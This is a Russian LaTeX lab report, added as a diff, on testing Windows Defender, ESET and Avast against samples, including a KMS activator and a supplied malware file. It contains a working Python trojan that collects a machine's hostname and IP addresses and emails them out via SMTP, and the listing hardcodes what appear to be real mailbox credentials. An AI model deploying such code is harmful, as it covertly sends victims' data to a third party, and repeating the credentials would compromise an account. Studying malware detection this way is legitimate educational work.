@@ -1,0 +1,135 @@
+\section{Цель работы}
+Цель: изучение и приобретение навыков работы с антивирусным программным обеспечением. 
+
+Задачи:
+\begin{itemize}
+    \item Конфигурирование антивирусного средства;
+    \item Лечение заведомо зараженных вредоносных программ.
+\end{itemize}
+
+
+\section{Ход работы}
+\subsection{Подготовка виртуальной машины}
+Для работы с вредоносным ПО подготовим виртуальную машину. Установим антивирус \textbf{ESET Nod32} и \textbf{Avast}. \textbf{Защитник Windows} уже установлен (Рисунки 1-4).
+
+\image{11.png}{Защитник Windows}{1}
+\image{12.png}{Eset}{1}
+\image{13.png}{Avast}{1}
+\FloatBarrier
+\clearpage
+
+\subsection{Подготовка вредоносного ПО}
+\subsubsection{Свой скрипт на Python}
+Напишем свой скрипт на \texttt{Python}, реализующий простейшую атаку: получение ip-адреса компьютера и отправление их по почте злоумышленнику. Подобный скрипт описан на портале \url{https://spy-soft.net/malware-rat-python/}.
+
+Код программы приведён в листинге ниже:
+
+\begin{lstlisting}[language={python}, caption={Вирус}, numbers=none, lineskip={0pt}]
+import smtplib as smtp
+import socket
+import urllib.request
+
+hostname = socket.gethostname()
+local_ip = socket.gethostbyname(hostname)
+
+public_ip = urllib.request.urlopen("http://ident.me").read().decode("utf8")
+
+email = "shadrunovas@yandex.ru"
+password = "ahnvoheyesskboag"
+dest_email = "shadrunovas@gmail.com"
+subject = "IP"
+email_text = f"Host: {hostname}\nLocal IP: {local_ip}\nPublic IP: {public_ip}"
+message = "From: {}\nTo: {}\nSubject: {}\n\n{}".format(
+    email, dest_email, subject, email_text
+)
+server = smtp.SMTP_SSL("smtp.yandex.com")
+
+server.ehlo(email)
+server.login(email, password)
+server.auth_plain()
+server.sendmail(email, dest_email, message)
+server.quit()
+\end{lstlisting}
+
+Далее необходимо собрать из скрипта исполняемый файл \textbf{.exe} для успешного детектирования антивирусами. Для этого используем модуль \textbf{pyinstaller} \linebreak (Рисунок 4):
+
+\image{21.png}{Установка pyinstaller}{1}
+\FloatBarrier
+
+Проверим работу скрипта (Рисунок 5-6):
+
+\image{22.png}{Запуск исполняемого файла}{1}
+\image{23.png}{Полученное письмо}{0.6}
+\FloatBarrier
+
+
+\subsubsection{Проверка скрипта в антивирусах}
+
+Сначала проверим работу \textbf{Защитника Windows}. Защитник Windows ничего не обнаружил (Рисунки 7-8). Скорее всего, влияют старые базы сигнатур, однако этот антивирус никогда не отличался выдающимися результатами.
+
+\image{31.png}{Защитник Windows}{1}
+\image{32.png}{Защитник Windows}{1}
+\FloatBarrier
+
+Теперь проверим продукт от \textbf{Eset}. Антивирус ничего не обнаружил (Рисунок 9). В данном случае базы также устаревшие.
+
+\image{33.png}{Eset}{1}
+\FloatBarrier
+
+Последний антивирус от \textbf{Avast} справился хорошо и определил вредоносное ПО — троян (Рисунки 10-11). В данном случае базы свежие.
+
+\image{34.png}{Выбор области сканирования}{1}
+\image{35.png}{Avast}{1}
+\FloatBarrier
+
+В завершение, загрузим файл \texttt{virus.exe} в \textbf{Virustotal}. Этот ресурс позволяет просканировать файл движками многих производителей. В результате получаем, что пять антивирусов зафиксировали вредоносную активность, в том числе \textbf{Avast} (Рисунок 12).
+
+\image{36.png}{Virustotal}{1}
+\FloatBarrier
+\clearpage
+
+\subsection{KMS Activator}
+Таким же образом проверим \textbf{kms activator} — утилиту, позволяющую активировать продукты компании Microsoft. 
+
+Сначала проверим работу \textbf{Защитника Windows}. Защитник Windows снова ничего не обнаружил (Рисунки 13-14).
+
+\image{41.png}{Защитник Windows}{1}
+\image{42.png}{Защитник Windows}{1}
+\FloatBarrier
+
+Теперь проверим продукт от \textbf{Eset}. Антивирус ничего не обнаружил (Рисунок 15).
+
+\image{43.png}{Eset}{1}
+\FloatBarrier
+
+\textbf{Avast} даже не пришлось запускать, как только архив с активатором был распакован, антивирус сразу же обнаружил нелегальное ПО (Рисунок 16). Активатор относится к категории \texttt{Win32:PUP-gen} — potentially unwanted program.
+
+\image{44.png}{Avast}{1}
+\FloatBarrier
+\clearpage
+
+
+\subsection{Предоставленный вирус}
+Таким же образом проверим вирус из архива — \texttt{mb4040777.exe}. 
+
+Сначала проверим работу \textbf{Защитника Windows}. Защитник Windows снова ничего не обнаружил (Рисунки 17-18).
+
+\image{51.png}{Защитник Windows}{1}
+\image{52.png}{Защитник Windows}{1}
+\FloatBarrier
+
+Теперь проверим продукт от \textbf{Eset}. В данном случае антивирус обнаружил вредоносное ПО и удалил файл, содержащий тело вируса (Рисунок 19).
+
+\image{53.png}{Eset}{1}
+\FloatBarrier
+
+\textbf{Avast} также определил вирус (Рисунок 20).
+
+\image{54.png}{Avast}{1}
+\FloatBarrier
+\clearpage
+
+\section{Выводы о проделанной работе}
+Я изучил и приобрёл навыки работы с антивирусным программным обеспечением различных вендоров (Microsoft, ESET, Avast), смог просканировать различные вредоносные файлы этими антивирусами, а также написал простейший троян с помощью Python. 
+
+\clearpage
